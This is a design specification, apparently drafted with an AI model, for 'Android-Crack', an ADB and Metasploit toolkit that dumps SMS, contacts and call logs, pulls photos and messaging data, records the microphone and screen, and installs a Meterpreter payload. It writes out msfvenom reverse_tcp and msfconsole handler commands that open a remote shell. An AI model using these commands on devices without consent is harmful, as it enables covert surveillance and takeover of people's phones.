# Android-Crack — Specification

Tool name: **Android-Crack**
Owner: Yash Koladiya
Status: clean-room design, original work
Domain: Android pen-test toolkit over ADB + Metasploit-Framework

> Sourced from public docs only: Android `adb` documentation, Metasploit docs, scrcpy README, nmap manual, AOSP source. No third-party tool source consulted.

---

## 1. Goals

1. Single-binary CLI to manage Android targets over ADB (USB or wireless).
2. One-click Meterpreter session via msfvenom + handler.
3. Bulk data export (screenshots, photos, SMS/contacts/call-log dumps).
4. Multi-device parallel ops (improvement over typical single-target wrappers).
5. Modern wireless ADB **pairing** (Android 11+, 6-digit code) — not just `tcpip 5555`.
6. Audit log of every action (who, when, which serial, command, exit code).
7. Plugin architecture so new ADB-based features drop in without core edits.

---

## 2. Use case / authorization

Authorized testing only:
- Devices owned by operator
- Engagements with written scope
- CTF / training labs
- Defensive research

Tool prints disclaimer + requires `--i-have-authorization` flag on first run (saved to config).

---

## 3. External dependencies (all public, all replaceable)

| Tool | Purpose | Install |
|---|---|---|
| `adb` (Android SDK platform-tools) | Device shell + transport | `brew install android-platform-tools` / apt / pacman / `pkg install android-tools` |
| `metasploit-framework` | `msfvenom` payload gen, `msfconsole` handler | `brew install --cask metasploit` / omnibus installer |
| `scrcpy` | Screen mirror + audio stream | `brew install scrcpy` / apt / build |
| `nmap` | Network discovery, ADB port fingerprint | `brew install nmap` / apt |
| Python ≥ 3.11 (tentative — see §5) | Runtime | system package |

---

## 4. Feature list (functional, not implementation)

Grouped by domain. Each entry = user-visible capability, not code structure.

### A. Connection / discovery
- Connect to device by `IP:PORT` (default 5555)
- Wireless pairing flow (Android 11+ pair code) — `adb pair host:port` + 6-digit code
- List active ADB devices with `device`/`unauthorized`/`offline` state
- Switch active device when multiple connected (ANDROID_SERIAL)
- Disconnect single / all
- Kill / start ADB server
- LAN scan for hosts with TCP 5555/5554 open (nmap `-p 5555,5554 -sV`)

### B. Device control
- Interactive shell
- Send keycode (numeric or named: HOME, BACK, POWER, DPAD_*, VOL_*, MEDIA_*)
- Send text
- Unlock (power on, swipe up, optional PIN, enter)
- Lock
- Reboot — system / recovery / bootloader / fastboot
- Power off
- Stay-on while charging (usb/all/off)

### C. App management
- List installed packages (all / third-party / system)
- Install APK (with `-r` replace)
- Install split APKs (`install-multiple`)
- Uninstall package
- Launch app (`monkey -p PKG 1`)
- Force-stop
- Clear data (`pm clear`)
- Grant / revoke runtime permission
- Extract installed APK to local disk
- Restart app (stop then launch)

### D. Filesystem
- List `/sdcard/` (or any path)
- Pull file/dir
- Push file/dir
- Pull common buckets: WhatsApp, Camera (DCIM), Screenshots, Downloads

### E. Data export
- SMS dump (`content query --uri content://sms`)
- Contacts dump (`content query --uri content://contacts/phones`)
- Call log dump (`content query --uri content://call_log/calls`)
- Logcat snippet (last N lines) and live stream

### F. Media
- Screenshot (`screencap -p`)
- Screen record (`screenrecord --time-limit`)
- Anonymous variants (delete remote after pull)
- Photo / audio / video open on device (push + `am start VIEW`)
- Mirror screen (scrcpy)
- Audio stream / record (scrcpy `--no-video` + `--audio-source`)

### G. Network / Wi-Fi
- IP/route/DNS snapshot (`ip addr`, `ip route`, `getprop net.dns1`)
- Wi-Fi status (filtered `dumpsys wifi`)
- WLAN IP
- Toggle Wi-Fi radio (`svc wifi enable|disable`)
- Saved Wi-Fi SSIDs (parse `cmd wifi list-networks` / `dumpsys wifi`)
- Ping connectivity test
- TCP forward / reverse (`adb forward`, `adb reverse`)

### H. Security flow
- Generate Android Meterpreter payload (`msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT= -o out.apk`)
- Install + auto-launch payload
- Start `msfconsole` with handler script

### I. Info / diagnostics
- Device info (model/maker/SoC/Android ver/security patch/SDK/SIM/encryption/build)
- Battery (`dumpsys battery`)
- Locale (`system_locales`, `persist.sys.locale`, `ro.product.locale`)
- Root/Magisk heuristics (build.tags, ro.debuggable, `which su`, magisk paths, magisk app)
- Developer-settings read/write (global namespace)

### J. New capabilities (upgrade over typical tools)
- **Parallel ops:** run same action across N selected serials simultaneously, results in table
- **Job queue:** schedule actions, retry on transient ADB drop
- **Session save:** persist target list + per-target notes + payload config
- **REST API mode:** `android-crack serve --port 8080` exposes capabilities as HTTP JSON
- **Web UI:** optional dashboard (separate process, talks to REST API)
- **Audit log:** SQLite log of every command (timestamp, serial, args, exit, stdout-hash)
- **Plugin system:** drop `*.py` into `plugins/` dir, auto-registered via entry-point spec
- **Profile presets:** named LHOST/LPORT/payload combos
- **Docker image:** ships adb + metasploit + nmap + scrcpy

---

## 5. Open decisions (need answer)

1. **Language**
   - Python 3.11+ (fastest to write, rich TUI via `textual` or `rich`)
   - Go (single binary, easy distribution)
   - Rust (single binary, harder ramp)
   - TypeScript + Bun (single binary via `bun build --compile`)

2. **License** — pick one for your code:
   - MIT — permissive, fewest strings
   - Apache-2.0 — permissive + patent grant
   - GPL-3.0 — copyleft, forces downstream to stay open

3. **Distribution channels**
   - GitHub source only
   - + PyPI (if Python)
   - + Homebrew tap
   - + Docker Hub / GHCR

4. **UI shape**
   - Numbered menu (classic, fast, no deps)
   - TUI app (textual/bubbletea — keyboard nav, panels, live tables)
   - CLI subcommands (`android-crack devices`, `android-crack pull ...`)
   - All three? CLI primary + `android-crack tui` for interactive

---

## 6. Proposed clean-room architecture (my design)

```
android-crack/
├── pyproject.toml          # if Python
├── README.md
├── LICENSE
├── CHANGELOG.md
├── docs/
│   ├── architecture.md
│   ├── plugin-api.md
│   └── authorization.md
├── android_crack/
│   ├── __init__.py
│   ├── __main__.py         # `python -m android_crack`
│   ├── app.py              # entry point, arg parse, mode select (cli/tui/serve)
│   ├── core/
│   │   ├── adb_client.py   # thin async wrapper around adb subprocess
│   │   ├── device_pool.py  # multi-device tracking, parallel dispatch
│   │   ├── session.py      # persisted target list + notes
│   │   ├── audit.py        # SQLite audit log writer
│   │   ├── tool_finder.py  # locate adb/msfvenom/scrcpy/nmap on PATH
│   │   └── settings.py     # pydantic config schema
│   ├── capabilities/       # one file per feature domain (A–J above)
│   │   ├── connect.py
│   │   ├── shell.py
│   │   ├── apps.py
│   │   ├── files.py
│   │   ├── exports.py
│   │   ├── media.py
│   │   ├── network.py
│   │   ├── exploit.py      # msfvenom + handler
│   │   ├── info.py
│   │   └── wifi.py
│   ├── plugins/
│   │   ├── __init__.py     # plugin loader (entry_points or directory scan)
│   │   └── examples/
│   ├── ui/
│   │   ├── cli.py          # argparse subcommands
│   │   ├── tui.py          # textual app
│   │   └── menu.py         # legacy numbered menu (optional)
│   └── api/
│       └── server.py       # FastAPI REST mode
├── tests/                  # pytest
└── .github/workflows/
    ├── ci.yml              # lint + type-check + tests
    └── release.yml         # build + push docker + pypi
```

Key design choices (mine, not copied):
- **Async adb client** with timeout/retry, not blocking subprocess everywhere.
- **Device pool** abstraction — every capability takes a `Device` handle, not implicit `ANDROID_SERIAL` env.
- **Capabilities are pure functions** taking `(device, params) → result`, no global state. Makes them callable from CLI / TUI / REST / plugin alike.
- **Audit log** wraps every capability call via decorator.
- **Type safety** — `pydantic` v2 models for inputs, `typer`/`click` for CLI.
- **Plugins** register via `entry_points` in `pyproject.toml`, fall back to directory scan for dev.

---

## 7. Build order

Phase 1 — MVP (skeleton + connect/shell/screenshot/device-info)
Phase 2 — Apps, files, exports, media
Phase 3 — Network, Wi-Fi, info, diagnostics
Phase 4 — Exploit flow (msfvenom + handler)
Phase 5 — Multi-device parallel + audit log
Phase 6 — REST + TUI
Phase 7 — Plugin system + docs
Phase 8 — Docker + CI/CD + release

Each phase ships testable. Don't bundle.

---

## 8. Things explicitly NOT included

- No anti-AV evasion / payload obfuscation help.
- No mass-targeting against unauthorized hosts in scanner output.
- No silent persistence module.
- No bypass for "Allow USB debugging" prompt.

Tool is for legal pen-testing only. Disclaimer printed every launch + required `--i-have-authorization` flag.

---

## 9. Reference commands (public ADB / Metasploit knowledge)

Subset — covers majority of capabilities. Sourced from Android dev docs + Metasploit docs.

```
# Discovery
adb devices -l
adb pair HOST:PORT          # Android 11+ wireless debug pair
adb connect HOST:5555
adb disconnect [HOST:PORT]
adb kill-server / start-server

# Shell
adb -s SERIAL shell <cmd>
adb shell input keyevent <CODE>
adb shell input text 'STRING'
adb shell input swipe X1 Y1 X2 Y2 MS

# Files
adb pull REMOTE LOCAL
adb push LOCAL REMOTE
adb shell ls -al /sdcard/

# Apps
adb shell pm list packages [-3 | -s]
adb shell pm path PACKAGE
adb shell pm clear PACKAGE
adb shell pm grant|revoke PKG PERM
adb install [-r] file.apk
adb install-multiple -r f1.apk f2.apk
adb uninstall PACKAGE
adb shell am start -a android.intent.action.VIEW -d URL
adb shell am force-stop PACKAGE
adb shell monkey -p PACKAGE 1

# Media
adb shell screencap -p /sdcard/X.png
adb shell screenrecord --time-limit N /sdcard/X.mp4

# Data
adb shell content query --uri content://sms/ --projection address:date:body
adb shell content query --uri content://contacts/phones/ --projection display_name:number
adb shell content query --uri content://call_log/calls --projection name:number:duration:date

# Info
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release
adb shell dumpsys battery
adb shell dumpsys wifi

# Network
adb shell ip addr / ip route
adb shell svc wifi enable|disable
adb shell svc power stayon usb|true|false
adb shell ping -c 4 HOST
adb forward tcp:LOCAL tcp:REMOTE
adb reverse tcp:REMOTE tcp:LOCAL

# Exploit (Metasploit public docs)
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o out.apk
msfconsole -x "use exploit/multi/handler; \
  set PAYLOAD android/meterpreter/reverse_tcp; \
  set LHOST IP; set LPORT PORT; exploit"

# Network scan (nmap public docs)
nmap -sn 192.168.1.0/24
nmap -p 5555,5554 -sT -sV --version-intensity 1 -T4 <hosts>

# scrcpy (public docs)
scrcpy
scrcpy -m 1024 -b 1M
scrcpy --no-video --audio-source=mic --record=out.opus
```

---

## 10. Answer these to start build

- [ ] Language?
- [ ] License?
- [ ] Distribution channels?
- [ ] UI shape?
- [ ] Authorization scope (own devices / pentest engagement / CTF / research)?
- [ ] OK to scaffold Phase 1 (skeleton + connect/shell/screenshot/info)?

Once answered → I scaffold Phase 1 in `/Users/yashkoladiya/Documents/Claude/Android-Crack/` and we iterate.
